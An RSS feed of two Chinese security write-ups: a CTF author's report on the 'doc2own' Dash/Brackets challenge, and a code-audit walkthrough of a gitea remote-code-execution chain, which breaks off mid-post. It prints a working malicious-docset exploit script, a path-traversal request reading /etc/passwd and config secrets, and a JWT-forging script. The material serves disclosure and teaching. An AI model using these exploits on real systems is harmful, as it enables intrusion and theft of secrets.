<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Fri, 10 Aug 2018 20:59:57 +0800</lastBuildDate>
<item>
<title>Real World CTF doc2own 命题报告</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-08-08-41544965.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/41544965&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-45dff9e7b0164cc42ef97d36d70acc61_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文作者：咸鱼&lt;/p&gt;&lt;p&gt;上个月的 realdworldctf 设计了一个完全真实的客户端软件 pwn 题目。&lt;/p&gt;&lt;p&gt;在接到出题邀请的时候也差点要“另请高明”了。当时正好在准备 &lt;a href=&quot;https://zhuanlan.zhihu.com/p/21776300&quot;&gt;LoCCS 的暑期学校&lt;/a&gt;的课件，因为拖延搞得讲课前夜通宵没睡狂写 ppt，紧接着又安排出差，趁着飞机延误之类的边角时间写评测环境和测试 exploit 之类，最后还是在比赛已经开始的情况下才在第一个晚上把稳定性堪忧的环境部署上线。&lt;/p&gt;&lt;p&gt;仓促的出题过程也是埋下了伏笔。竟然在比赛过程中，先后有几支国际队伍交上了真正的 0day 利用。而赛后我简单反编译了程序，还发现了更多的远程代码执行问题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;由于补丁今天刚刚发布，在这里我不会公开相关漏洞的细节。&lt;/b&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;在年初我偶然发现了一个 Visual Studio Code 的远程代码执行漏洞，而报告后发现被撞洞了。这个问题是 Electron 使用了 Chromium 的远程前端调试协议，是基于 http 和 WebSocket 的。&lt;/p&gt;&lt;p&gt;攻击者在知道调试端口的情况下，可以使用 dns 重绑定的技巧获得一个随机的 uuid，构造一个 WebSocket 协议的 url，向 Electron 的前端注入任意代码，实现 node.js 任意代码执行。&lt;/p&gt;&lt;p&gt;VSCode 在部分版本中意外开启了 Extension 进程的调试端口，只要浏览一个网页并停留数十秒（dns rebinding 需要一段时间让旧 dns 记录失效），计算机便可被远程控制：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;Visual Studio Code silently fixed a remote code execution vulnerability&lt;/a&gt;&lt;p&gt;受此启发我在 Adobe Brackets 上发现了完全一致的漏洞：&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/adobe/brackets/issues/14149&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;CEF remote debugging is vulnerable to dns rebinding attack #14149&lt;/a&gt;&lt;p&gt;与 VSCode 不同的是，Adobe Brackets 没有使用 Electron，而是自行封装的 libCEF 框架，与 node.js 的集成方式也不同。Electron 可以在 window 的上下文中访问 node.js API，而 Brackets 的编辑器前端则没有提供这个功能，尽管 Brackets 当中使用到了 node.js 运行时。&lt;/p&gt;&lt;p&gt;不过 Brackets 在上下文中暴露了如下的两个对象：brackets 和 appshell&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1387cef8bb0e11e95bd04389228fc2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1612&quot; data-rawheight=&quot;834&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f1387cef8bb0e11e95bd04389228fc2f&quot; data-watermark-src=&quot;v2-2cfaacf85c79d72c0eb08060a3756933&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这两个对象封装了文件系统和 shell 相关的功能。虽然我们不能 require(&#39;child_process&#39;)，但是通过 appshell.fs 可以实现任意文件读写。到文件读写这一步其实已经可以拿 flag 了，当然一开始我们没有给出 flag 的路径，还是反弹一个 shell 比较靠谱。覆盖可执行文件加上额外的触发条件即可实现远程代码执行。&lt;/p&gt;&lt;p&gt;在 Brackets 的扩展接口中，我找到了如下两个与系统 shell 相关的方法：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;brackets.app.openURLInDefaultBrowser&lt;/li&gt;&lt;li&gt;brackets.app.showOSFolder&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;前者支持打开 file:/// 域名，在 Windows 下相当于 ShellExecute，打开一个 .cmd 或者 .exe 即可执行代码；而 showOSFolder 在 macOS 下的表现是，如果文件夹是一个有效的 .app bundle，那么等同于双击 .app，也就是运行。如果你不太明白，那么请尝试在终端中执行&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;find /Applications/Calculator.app
open /Applications/Calculator.app&lt;/code&gt;&lt;p&gt;因此我们先判断平台差异，通过 appshell.fs 创建可执行文件，然后调用对应的方法即可运行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function calc() {  // use brackets.fs to write your own executable  // makedir, writeFile, chmod are your friends  if (brackets.app.getUserDocumentsDirectory().indexOf(&#39;/&#39;) === 0) {    brackets.app.showOSFolder(&#39;/Applications/Calculator.app&#39;);  } else {    brackets.app.openURLInDefaultBrowser(&#39;file:///C:/windows/system32/calc.exe&#39;);  }}&lt;/code&gt;&lt;p&gt;到这里即可实现与 VSCode 之前的 bug 完全一致的效果，通过 dns 重绑定攻击本地端口实现远程代码执行。在我之前的漏洞报告后，libCEF 参考 node.js 和 Electron 的做法修复了 dns 重绑定的问题。但是最新版 Brackets 的这个端口仍然可以从 localhost 访问。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;为什么盯上了 Dash 呢？&lt;/p&gt;&lt;p&gt;Dash 可以说是以 macOS 为主力开发环境的程序员当中很受欢迎的一款工具了，主要功能就是离线看文档。文档是一个后缀为 docset 的 bundle 文件夹，存放 html 资源和索引数据库等。&lt;/p&gt;&lt;p&gt;它具有两个攻击面，一个是展示文档时用的是 WebView，另一个是在打开文档的时候会启用一个内置的 GCDWebServer 来启动一个 http 服务，可通过其他计算机访问。&lt;/p&gt;&lt;p&gt;macOS 上的 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//developer.apple.com/documentation/webkit/webview%3Flanguage%3Dobjc&quot;&gt;WebView&lt;/a&gt; 和 iOS 的 UIWebView 在很多方面是一样的：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;没有进程隔离和 sandbox&lt;/li&gt;&lt;li&gt;在 file:/// 域下的文件默认具有 AllowUniversalAccessFromFileURLs 和 AllowFileAccessFromFileURLs 的 UXSS 能力&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在之前版本的 Dash 就可以通过一个恶意的 docset，以 XMLHttpRequest 的方式读取并上传本地文件（例如 ssh 公私钥）的内容。在 3.x 的某一个版本（具体不详）中增加了限制，如果访问的文件在 docset 目录之外会失败。但这个版本可以使用在压缩包中添加符号链接的方式绕过（由于 docset 是文件夹，通常的分发方式是使用 tar.gz 包）。此外符号链接的问题同样影响 Dash 内置的 http 服务。&lt;/p&gt;&lt;p&gt;经过报告后修复了本地文件泄露的问题，这也为出题提供了一个绝佳的条件——这是个允许跨域请求，却又不能简单 AJAX 读本地文件的环境，选手必须实现实质性的远程代码执行。最后这个 WebView 和系统内置 Safari 的 WebKit 是一致的，避免选手使用已公开的浏览器漏洞利用代码来获得权限。至于打 ctf 用 Safari 0day？疯了吗。&lt;/p&gt;&lt;hr&gt;&lt;blockquote&gt;&lt;b&gt;doc2own&lt;/b&gt; ( Points: 425, Solved by 4 Teams )&lt;br&gt;I have to fix these issues during the flight. Since that airline does not provide Internet, I have to download some documents for offline use.&lt;br&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//34.236.229.208%3A8080&quot;&gt;http://34.236.229.208:8080&lt;/a&gt;&lt;br&gt;Hint : It’s a pwnable game. You really need to achieve RCE to get the flag.&lt;/blockquote&gt;&lt;p&gt;题目设定的剧情就是一个像我一样的信息技术底层劳动力，在出差的路上需要修 bug，又没网，只能下一个离线文档备用。而这时候下到了不干净的文档，于是电脑中招了。&lt;/p&gt;&lt;p&gt;217 战队按照预期的解法做了出来。&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;https://blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&lt;/a&gt;&lt;p&gt;在这里附上我自己调试通过的一个解法，生成一个 docset，在 Brackets 运行的情况下打开会弹出一个计算器&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;contents=exploit.docset/Contentsdocs=$contents/Resources/Documents

rm -r $contentsmkdir -p $docs
cat &amp;gt; $docs/index.html &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;script&amp;gt;
async function main() {  const list = await fetch(&#39;http://localhost:9234/json&#39;).then(r =&amp;gt; r.json());  const item =  list.find(item =&amp;gt; item.url.indexOf(&#39;file:///&#39;) === 0);  if (!item) return console.error(&#39;invalid response&#39;);  const url = `ws://127.0.0.1:9234/devtools/page/${item.id}`;  console.log(&#39;url:&#39; + url);  exploit(url);}function exploit(url) {  function calc() {    const fs = window.appshell.fs;    const mkdir = path =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.makedir(path, 0755, err =&amp;gt; err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const writeFile = (path, content) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.writeFile(path, content, &#39;utf8&#39;, false, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const chmod = (path, mode) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.chmod(path, mode, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const INFO_PLIST = `&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
      &amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
      &amp;lt;plist version=&quot;1.0&quot;&amp;gt;
      &amp;lt;dict&amp;gt;
        &amp;lt;key&amp;gt;CFBundleExecutable&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;hello&amp;lt;/string&amp;gt;
        &amp;lt;key&amp;gt;CFBundleIconFile&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;AppIcon&amp;lt;/string&amp;gt;
      &amp;lt;/dict&amp;gt;
      &amp;lt;/plist&amp;gt;`;    const EXEC = `#!/bin/sh      open -a Calculator`;    const app = &#39;/tmp/test.app/&#39;;    const base = app + &#39;Contents/&#39;    return mkdir(base + &#39;MacOS&#39;)      .then(writeFile(base + &#39;Info.plist&#39;, INFO_PLIST))      .then(writeFile(base + &#39;MacOS/hello&#39;, EXEC))      .then(chmod(base + &#39;MacOS/hello&#39;, 0777))      .then(new Promise((resolve, reject) =&amp;gt; {        brackets.app.showOSFolder(app)      }));  }  const ws = new WebSocket(url);  ws.onopen = async () =&amp;gt; {    let counter = 13371337;    const send = (method, params) =&amp;gt; new Promise((resolve, reject) =&amp;gt; {      const id = counter++;      const recv = ({ data }) =&amp;gt; {        const parsed = JSON.parse(data);        if (parsed.id === id) {          resolve(parsed.result);          ws.removeEventListener(&#39;message&#39;, recv);        } else {          console.log(&#39;message: &#39;, data);        }      };      ws.addEventListener(&#39;message&#39;, recv);      ws.send(JSON.stringify({ id, method, params }));    });    const response = await send(&#39;Runtime.evaluate&#39;, { expression: `(${calc})()` });    console.log(response.result);    ws.close();  }  ws.onerror = () =&amp;gt; console.log(&#39;failed to connect&#39;);}main();&amp;lt;/script&amp;gt;
EOF

cat &amp;gt; $contents/Info.plist &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
  &amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;CFBundleName&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;Exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;DocSetPlatformFamily&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;dashIndexFilePath&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;index.html&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;isDashDocset&amp;lt;/key&amp;gt;
  &amp;lt;true/&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
EOF

sqlite3 -batch $contents/Resources/docSet.dsidx &amp;lt;&amp;lt; &quot;EOF&quot;CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#39;Exploit&#39;, &#39;Class&#39;, &#39;index.html&#39;);EOF

open exploit.docset

tar czf exp.tar.gz exploit.docset&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9aed9f3c57895c564fc6c61b0437830f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;364&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9aed9f3c57895c564fc6c61b0437830f&quot; data-watermark-src=&quot;v2-ce59018ec0a4bbcde7976e3433c41c84&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;hr&gt;&lt;p&gt;但是出乎我意料的是，另外三支强队 PPP, CyKOR 和 ESPR 在短短的比赛期间内直接交上了两个不同的 0day 解法。赛后我向厂商整理漏洞报告，又快速浏览了一遍反汇编，又发现了另外的一些疑似远程代码执行问题（我没有做 poc，经过开发者自己确认存在）。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Dash 作者接到报告之后非常迅速地推出了修复补丁，检查了线上的 Dash 文档仓库确保之前没有实质性的攻击，在更新日志中明确写明了安全漏洞的存在并对以上战队表示了致谢。应急响应做得非常不错。&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c1224d9312c077421d4def640a5263d5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;1188&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c1224d9312c077421d4def640a5263d5&quot; data-watermark-src=&quot;v2-8696ee455e323a6046252f1330f416cb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Dash 用户请尽快升级到 4.4.0 来修复这些问题。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-08-08-41544965</guid>
<pubDate>Wed, 08 Aug 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Go代码审计 - gitea 远程命令执行漏洞链</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-07-16-39835913.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/39835913&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-111a2318c077e5d343649b60742fa217_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是一个非常漂亮的漏洞链，很久没见过了。&lt;br&gt;我用docker来复现并学习这个漏洞，官方提供了docker镜像，vulhub也会上线这个环境。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_1&quot;&gt;漏洞一、 逻辑错误导致权限绕过&lt;/a&gt;&lt;/h2&gt;&lt;blockquote&gt;这是本漏洞链的导火索，其出现在Git LFS的处理逻辑中。&lt;br&gt;Git LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git objects和.git文件夹下其实是没有这个文件的，这个文件储存在git服务器上。gitea作为一个git服务器，也提供了LFS功能。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;在 modules/lfs/server.go 文件中，PostHandler是POST请求的处理函数：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d929f2e40baaf6f1cfe1bfd334683da8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;564&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d929f2e40baaf6f1cfe1bfd334683da8&quot; data-watermark-src=&quot;v2-30163bf9e945a1bb9751aa52c6556186&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可见，其中间部分包含对权限的检查：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
if !authenticate(ctx, repository, rv.Authorization, true) {
    requireAuth(ctx)
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;在没有权限的情况下，仅执行了requireAuth函数：这个函数做了两件事，一是写入WWW-Authenticate头，二是设置状态码为401。也就是说，在没有权限的情况下，并没有停止执行PostHandler函数。&lt;br&gt;所以，这里存在一处权限绕过漏洞。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_2&quot;&gt;漏洞二、目录穿越漏洞&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;这个权限绕过漏洞导致的后果是，未授权的任意用户都可以为某个项目（后面都以vulhub/repo为例）创建一个Git LFS对象。&lt;/p&gt;&lt;p&gt;这个LFS对象可以通过http://example.com/vulhub/repo.git/info/lfs/objects/[oid]这样的接口来访问，比如下载、写入内容等。其中[oid]是LFS对象的ID，通常来说是一个哈希，但gitea中并没有限制这个ID允许包含的字符，这也是导致第二个漏洞的根本原因。&lt;/p&gt;&lt;p&gt;我们利用第一个漏洞，先发送一个数据包，创建一个Oid为....../../../etc/passwd的LFS对象：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
Host: your-ip:3000Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; 
Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 151

{ 
    &quot;Oid&quot;: &quot;....../../../etc/passwd&quot;, 
    &quot;Size&quot;: 1000000, 
    &quot;User&quot; : &quot;a&quot;, 
    &quot;Password&quot; : &quot;a&quot;, 
    &quot;Repo&quot; : &quot;a&quot;, 
    &quot;Authorization&quot; : &quot;a&quot;
}&lt;/code&gt;&lt;p&gt;其中，vulhub/repo是一个公开的项目。&lt;/p&gt;&lt;blockquote&gt;也就是说，这个漏洞的利用是有条件的，第一个条件就是需要有一个公开项目。为什么呢？虽然“创建LFS对象”接口有权限绕过漏洞，但是“读取这个对象所代表的文件”接口没有漏洞，会先检查你是否有权限访问这个LFS对象所在的项目。只有公开项目才有权限读取。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;见下图，发送数据包后，虽然返回了401状态码，但实际上这个LFS对象已经创建成功，且其Oid为....../../../etc/passwd。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e9540049efacee155988a5491e99364_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;150&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e9540049efacee155988a5491e99364&quot; data-watermark-src=&quot;v2-565bff4dd5b1e6d812fa0a1f56416882&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;第二步，就是访问这个对象。访问方法就是GET请求http://example.com/vulhub/repo.git/info/lfs/objects/[oid]/sth，oid就是刚才指定的，这里要用url编码一下。&lt;/p&gt;&lt;p&gt;见下图，/etc/passwd已被成功读取：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-67ea3af4a552aa4f3206b88d1f1225ee_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;291&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-67ea3af4a552aa4f3206b88d1f1225ee&quot; data-watermark-src=&quot;v2-90dc0125fbfb188264dc7b126b1caf69&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么，我们来看看为什么读取到了/etc/passwd文件。&lt;/p&gt;&lt;p&gt;代码 modules/lfs/content_store.go ：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d8ad85235bfa87345192ce67c32dad27_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;368&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d8ad85235bfa87345192ce67c32dad27&quot; data-watermark-src=&quot;v2-12d9755017f8fa97cd644ba53e169c65&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可见，meta.Oid被传入transformKey函数，这个函数里，将Oid转换成了key[0:2]/key[2:4]/key[4:]这样的形式，前两个、中间两个字符做为目录名，第四个字符以后的内容作为文件名。&lt;/p&gt;&lt;p&gt;那么，我创建的Oid为....../../../etc/passwd，在经过transformKey函数后就变成了../../../../../etc/passwd，s.BasePath是LFS对象的基础目录，二者拼接后自然就读取到了/etc/passwd文件。&lt;/p&gt;&lt;p&gt;这就是第二个漏洞：目录穿越。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#jwt&quot;&gt;漏洞三、读取配置文件，构造JWT密文&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;vulhub/repo虽然是一个公开项目，但默认只有读权限。我们需要进一步利用。&lt;/p&gt;&lt;p&gt;我们利用目录穿越漏洞，可以读取到gitea的配置文件。这个文件在$GITEA_CUSTOM/conf/app.ini，$GITEA_CUSTOM是gitea的根目录，默认是/var/lib/gitea/，在vulhub里是/data/gitea。&lt;/p&gt;&lt;p&gt;所以，要从LFS的目录跨越到$GITEA_CUSTOM/conf/app.ini，需要构造出的Oid是....gitea/conf/app.ini （经过转换后就变成了/data/gitea/lfs/../../gitea/conf/app.ini，也就是/data/gitea/conf/app.ini。原漏洞作者给出的POC这一块是有坑的，这个Oid需要根据不同$GITEA_CUSTOM的设置进行调整。）&lt;/p&gt;&lt;p&gt;成功读取到配置文件（仍需先发送POST包创建Oid为....gitea/conf/app.ini的LFS对象）：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7b45c16567a56377885231cc84353a7b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;310&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7b45c16567a56377885231cc84353a7b&quot; data-watermark-src=&quot;v2-47c9e387bc1818ef94ba83b04b5c7a8e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;配置文件中有很多敏感信息，如数据库账号密码、一些Token等。如果是sqlite数据库，我们甚至能直接下载之。当然，密码加了salt。&lt;/p&gt;&lt;p&gt;Gitea中，LFS的接口是使用JWT认证，其加密密钥就是配置文件中的LFS_JWT_SECRET。所以，这里我们就可以用来构造JWT认证，进而获取LFS完整的读写权限。&lt;/p&gt;&lt;p&gt;我们用python来生成密文：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;import jwt
import time
import base64
 
 
def decode_base64(data):
 missing_padding = len(data) % 4
 if missing_padding != 0:
 
data += &#39;=&#39;* (4 - missing_padding)
 return base64.urlsafe_b64decode(data)
 
 
jwt_secret = decode_base64(&#39;oUsPAAkeic6HaBMHPiTVHxTeCrEDc29sL6f0JuVp73c&#39;)
public_user_id = 1
public_repo_id = 1
nbf = int(time.time())-(60*60*24*1000)
exp = int(time.time())+(60*60*24*1000)
 
token = jwt.encode({&#39;user&#39;: public_user_id, &#39;repo&#39;: public_repo_id, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, jwt_secret, algorithm=&#39;HS256&#39;)
token = token.decode()
 
print(token)&lt;/code&gt;&lt;p&gt;其中，jwt_secret是第二个漏洞中读取到的密钥；public_user_id是项目所有者的id，public_repo_id是项目id，这个项目指LFS所在的项目；nbf是指这个密文的开始时间，exp是这个密文的结束时间，只有当前时间处于这两个值中时，这个密文才有效。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-17a35c2d4302d791cab708317b57799a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;29&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_3&quot;&gt;漏洞四、利用条件竞争，写入任意文件&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/h2&gt;&lt;p&gt;现在，我们能构造JWT的密文，即可访问LFS中的写入文件接口，也就是PutHandler。&lt;br&gt;PUT操作主要是如下代码：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-15b38cbef6917579ef30c29b98abe334_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;504&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-15b38cbef6917579ef30c29b98abe334&quot; data-watermark-src=&quot;v2-4f9ee61ea61472e828aa6b82a5c88b86&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;整个过程整理如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;transformKey(meta.Oid) + .tmp 后缀作为临时文件名&lt;/li&gt;&lt;li&gt;如果目录不存在，则创建目录&lt;/li&gt;&lt;li&gt;将用户传入的内容写入临时文件&lt;/li&gt;&lt;li&gt;如果文件大小和meta.Size不一致，则返回错误（meta.size是第一步中创建LFS时传入的Size参数）&lt;/li&gt;&lt;li&gt;如果文件哈希和meta.Oid不一致，则返回错误&lt;/li&gt;&lt;li&gt;将临时文件重命名为真正的文件名&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;因为我们需要写入任意文件，所以Oid一定是能够穿越到其他目录的一个恶意字符串，而一个文件的哈希（sha256）却只是一个HEX字符串。所以上面的第5步，一定会失败导致退出，所以不可能执行到第6步。也就是说，我们只能写入一个后缀是“.tmp”的临时文件。&lt;br&gt;另外，作者用到了defer os.Remove(tmpPath)这个语法。在go语言中，defer代表函数返回时执行的操作，也就是说，不管函数是否返回错误，结束时都会删除临时文件。&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;所以，我们需要解决的是两个问题：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;能够写入一个.tmp为后缀的文件，怎么利用？&lt;/li&gt;&lt;li&gt;如何让这个文件在利用成功之前不被删除？&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们先思考第二个问题。漏洞发现者给出的方法是，利用条件竞争。&lt;/p&gt;&lt;p&gt;&lt;br&gt;因为gitea中是用流式方法来读取数据包，并将读取到的内容写入临时文件，那么我们可以用流式HTTP方法，传入我们需要写入的文件内容，然后挂起HTTP连接。这时候，后端会一直等待我传剩下的字符，在这个时间差内，Put函数是等待在io.Copy那个步骤的，当然也就不会删除临时文件了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;那么，思考第一个问题，.tmp为后缀的临时文件，我们能做什么？&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;a 